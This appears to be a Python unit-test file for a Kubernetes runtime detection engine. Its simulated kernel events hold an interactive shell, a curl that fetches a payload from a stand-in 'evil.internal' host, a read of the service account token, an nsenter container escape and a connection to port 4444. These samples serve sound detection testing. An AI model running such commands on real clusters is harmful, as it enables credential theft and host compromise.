"""
Unit tests for ThreatGuard Detection and Correlation Engine.
"""

import unittest
from runtime.engine.correlation_engine import ThreatGuardCorrelationEngine
from runtime.engine.models import ThreatGuardDetection

class TestCorrelationEngine(unittest.TestCase):
    def setUp(self):
        self.engine = ThreatGuardCorrelationEngine(protected_namespace="threatguard")

    def test_runtime_001_shell_execution(self):
        event = {
            "time": "2026-09-05T12:00:00Z",
            "process_exec": {
                "process": {
                    "binary": "/bin/sh",
                    "arguments": "-i",
                    "pid": 4122,
                    "uid": 10001,
                    "pod": {
                        "namespace": "threatguard",
                        "name": "sample-app-6c9f",
                        "container": {"name": "web"}
                    },
                    "parent": {"binary": "/usr/local/bin/python"}
                }
            }
        }
        det = self.engine.process_raw_tetragon_event(event)
        self.assertIsNotNone(det)
        self.assertEqual(det.rule_id, "RUNTIME-001")
        self.assertEqual(det.severity, "CRITICAL")
        self.assertEqual(det.technique, "T1059.004")
        self.assertEqual(det.container, "web")
        self.assertEqual(det.process, "/bin/sh")

    def test_runtime_002_network_utility(self):
        event = {
            "time": "2026-09-05T12:01:00Z",
            "process_exec": {
                "process": {
                    "binary": "/usr/bin/curl",
                    "arguments": "-s https://evil.internal/payload.sh",
                    "pid": 4150,
                    "uid": 10001,
                    "pod": {
                        "namespace": "threatguard",
                        "name": "sample-app-6c9f",
                        "container": {"name": "web"}
                    }
                }
            }
        }
        det = self.engine.process_raw_tetragon_event(event)
        self.assertIsNotNone(det)
        self.assertEqual(det.rule_id, "RUNTIME-002")
        self.assertEqual(det.severity, "HIGH")
        self.assertEqual(det.technique, "T1105")

    def test_runtime_003_reconnaissance(self):
        event = {
            "time": "2026-09-05T12:02:00Z",
            "process_exec": {
                "process": {
                    "binary": "/usr/bin/whoami",
                    "arguments": "",
                    "pid": 4160,
                    "uid": 10001,
                    "pod": {
                        "namespace": "threatguard",
                        "name": "sample-app-6c9f",
                        "container": {"name": "web"}
                    }
                }
            }
        }
        det = self.engine.process_raw_tetragon_event(event)
        self.assertIsNotNone(det)
        self.assertEqual(det.rule_id, "RUNTIME-003")
        self.assertEqual(det.severity, "MEDIUM")
        self.assertEqual(det.technique, "T1082")

    def test_runtime_004_sensitive_file_read(self):
        event = {
            "time": "2026-09-05T12:03:00Z",
            "process_kprobe": {
                "function_name": "security_file_open",
                "process": {
                    "binary": "/bin/cat",
                    "pod": {
                        "namespace": "threatguard",
                        "name": "sample-app-6c9f",
                        "container": {"name": "web"}
                    }
                },
                "args": [
                    {"file_arg": {"path": "/var/run/secrets/kubernetes.io/serviceaccount/token"}},
                    {"int_arg": 0}
                ]
            }
        }
        det = self.engine.process_raw_tetragon_event(event)
        self.assertIsNotNone(det)
        self.assertEqual(det.rule_id, "RUNTIME-004")
        self.assertEqual(det.severity, "CRITICAL")
        self.assertEqual(det.technique, "T1552.007")

    def test_runtime_005_priv_escalation(self):
        event = {
            "time": "2026-09-05T12:04:00Z",
            "process_exec": {
                "process": {
                    "binary": "/usr/bin/nsenter",
                    "arguments": "--target 1 --mount --uts --ipc --net --pid",
                    "pid": 4180,
                    "uid": 10001,
                    "pod": {
                        "namespace": "threatguard",
                        "name": "sample-app-6c9f",
                        "container": {"name": "web"}
                    }
                }
            }
        }
        det = self.engine.process_raw_tetragon_event(event)
        self.assertIsNotNone(det)
        self.assertEqual(det.rule_id, "RUNTIME-005")
        self.assertEqual(det.severity, "CRITICAL")
        self.assertEqual(det.technique, "T1068")

    def test_runtime_006_outbound_network(self):
        event = {
            "time": "2026-09-05T12:05:00Z",
            "process_kprobe": {
                "function_name": "sys_enter_connect",
                "process": {
                    "binary": "/usr/local/bin/python",
                    "pod": {
                        "namespace": "threatguard",
                        "name": "sample-app-6c9f",
                        "container": {"name": "web"}
                    }
                },
                "args": [
                    {"int_arg": 3},
                    {"sock_arg": {"daddr": "198.51.100.23", "dport": 4444, "proto": "TCP"}}
                ]
            }
        }
        det = self.engine.process_raw_tetragon_event(event)
        self.assertIsNotNone(det)
        self.assertEqual(det.rule_id, "RUNTIME-006")
        self.assertEqual(det.severity, "HIGH")
        self.assertEqual(det.technique, "T1071")

    def test_ignore_events_from_unprotected_namespace(self):
        event = {
            "time": "2026-09-05T12:06:00Z",
            "process_exec": {
                "process": {
                    "binary": "/bin/bash",
                    "arguments": "-c uptime",
                    "pod": {
                        "namespace": "kube-system",
                        "name": "kube-proxy-abc",
                        "container": {"name": "kube-proxy"}
                    }
                }
            }
        }
        det = self.engine.process_raw_tetragon_event(event)
        self.assertIsNone(det)

if __name__ == "__main__":
    unittest.main()
